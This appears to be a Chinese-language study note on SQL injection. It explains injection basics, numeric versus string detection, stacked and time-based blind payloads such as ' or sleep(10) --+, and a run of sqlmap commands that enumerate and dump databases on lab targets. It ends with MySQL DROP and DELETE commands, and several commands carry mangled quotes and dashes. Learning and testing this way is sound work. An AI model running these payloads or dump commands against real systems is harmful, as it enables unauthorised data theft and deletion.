SQL注入

基本知识

(1) or 1=1 永远成立，绕过条件限制，显示当前选中的所有内容

(2) #和--+以及（这里的+在url里面会被解析成空格，因此–后面必须要跟一个空格）注释单引号或者’匹配后面的那个单引号

(3) id=2-1，输出1的信息，id=’2-1’，输出2的信息，因为算术运算符在字符串里面不起作用

(4) union连接两个select查询语句，列数必须相同，表示在哪一列中返回结果，但是and后面的布尔判断不需要

(5) 使用 UNION 连接两条语句时，有一条错误就报错，剩下情况互不影响，且只能执行查询语句

(6) and连接条件语句时，只有两条全为true时，才会返回结果

传参类型

当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。

测试步骤：

（1） 加单引号，URL：xxx.xxx.xxx/xxx.php?id=3’； 报错

（2） 加and 1=1 ，URL：xxx.xxx.xxx/xxx.php?id=3 and 1=1； 返回为空，但不会报错

当输入的参数为字符型时，如果存在注入漏洞，可以认为是字符型注入。

测试步骤：

（1）加id=1’单引号 报错

（2）加id=1’–+ 不报错，返回为空

（3）使用id=1’ or sleep(10) –+， 返回时间明显长了很多

综上：使用id=1' and 1=2 --+和id=1' and 1=1 --+即可判断（报错为数字，回显不一样即为字符）

什么是字符集？

字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。常见的字符集有ascii编码，gbk编码和UTF-8编码，字符大小为两个字节的成为宽字节，一个的成为窄字节

堆叠注入(stacked injection)

如果两个任意sql语句（包括增删改查）通过;连接，都执行正确的话（包括空数据），都返回结果；前面正确，后面错误，只返回前面；前面错误，后面正确，什么都不返回。

这个漏洞的目的不是为了常规的获取信息，而是在对第一个sql语句过滤很严格（把select禁掉），把其他注入手段都屏蔽掉的时候，但是单单没有过滤;那么就可以在后面跟上常规语句进行注入

时间盲注

适用情况：

  1. 页面没有回显位置（联合注入无法使用）
  2. 页面不显示数据库的报错信息（报错注入无法使用）
  3. 无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）

select * from movies where title='Iron Man' or sleep(1);

select * from movies where title='Iron Man' and sleep(1);

使用or连接的话，如果第一个报错，不会sleep；如果这个字段存在，会sleep之后回显数据；如果不存在的话，只会sleep。（用来判断是否存在注入点）

由于and语句连接两个语句同时成立才能发生，所以如果数据库中有Iron man字段时，返回结果为空但是会执行sleep。如果没有这个字段的话，返回结果仍为空且不执行后面的sleep;如果报错，都不执行。意思就是,这个可以验证前面的字段是否存在。

总结：or判断注入点，and判断存在性

基于这个时间盲注，如果拿到注入点，我们就可以构造payload

判断数据库长度

在实战中我们并不知道注入点title的值，那么我们就可以利用or'语句绕过，然后判断字符串的长度，如果符合，那么就sleep。否则不sleep。

SQLMAP命令(Windows)

GET型

判断注入点

python sqlmap.py -u “http://sqllab:8989/Less-1/?id=1"--batch

python sqlmap.py -u “https://127.0.0.1/sql.php?id=1&name=2“ -p name –batch

查询所有数据库

python sqlmap.py -v 3 -u “http://sqllab:8989/Less-1/?id=1“ –dbs –batch（单一参数）

python sqlmap.py -u “https://127.0.0.1/sql.php?id=1&name=2“ - id –batch –dbs（多参数）

查询当前数据库

python sqlmap.py -v 3 -u “http://sqllab:8989/Less-1/?id=1“ –current-db

python sqlmap.py-u “https://127.0.0.1/sql.php?id=1&name=2“ -p id –batch –current-db

查询当前数据库的表

python sqlmap.py -v 3 -u “http://127.0.0.1/sqli-labs/Less-1/?id=1“ -D “当前数据库名” –tables

python sqlmap.py-u “https://127.0.0.1/sql.php?id=1&name=2“ -p id –batch -D “当前数据库名” –tables

查询指定表的列

python sqlmap.py -v 3 -u “http://127.0.0.1/sqli-labs/Less-1/?id=1“ -D “数据库名” -T “表名” –columns

查询表的数据

python sqlmap.py -v 3 -u “http://127.0.0.1/sqli-labs/Less-1/?id=1“ -D “数据库名” -T “表名” –dump

POST型

判断注入点

python sqlmap.py-u “https://127.0.0.1/sql.php“ –method=POST –data=”id=1&name=tom” –batch

根据注入点进行攻击(id为注入点),列出所有数据库

python sqlmap.py-u “https://127.0.0.1/sql.php“ –method=POST –data=”id=1&name=tom” -p “id” –dbs –batch

查找数据库中的某个表

python sqlmap.py-u “http://example.com/vulnerable_page“ –method=POST –data=”id=1&name=2” -p “id” -D “当前数据库名字” –tables –batch

查找表中的列

python sqlmap.py-u “http://example.com/vulnerable_page“ –method=POST –data=”id=1&name=2” -p “id” -D “当前数据库的名字” -T “指定表的名字” –columns

导出所有列的数据

python sqlmap.py-u “http://example.com/vulnerable_page“ –method=POST –data=”id=1&name=2” -p “id” -D “当前数据库名字” -T “指定表名字” –dump

导出特定列的数据

python sqlmap.py-u “http://example.com/vulnerable_page“ –method=POST –data=”id=1&name=2” -p “id” -D “当前数据库名字” -T “指定表” -C “指定列” –dump

MySQL备份及删除命令

备份所有数据库：mysqldump -u [username] -p --all-databases > all_databases_backup.sql

备份指定数据库：mysqldump -u [username] -p [database_name] > [database_name]_backup.sql

备份指定表：mysqldump -u [username] -p [database_name] [table_name] > [table_name]_backup.sql

删除指定数据库:DROP DATABASE [database_name];

删除指定表:DROP TABLE [database_name].[table_name];

删除指定表中的数据:DELETE FROM [table_name] WHERE [condition];
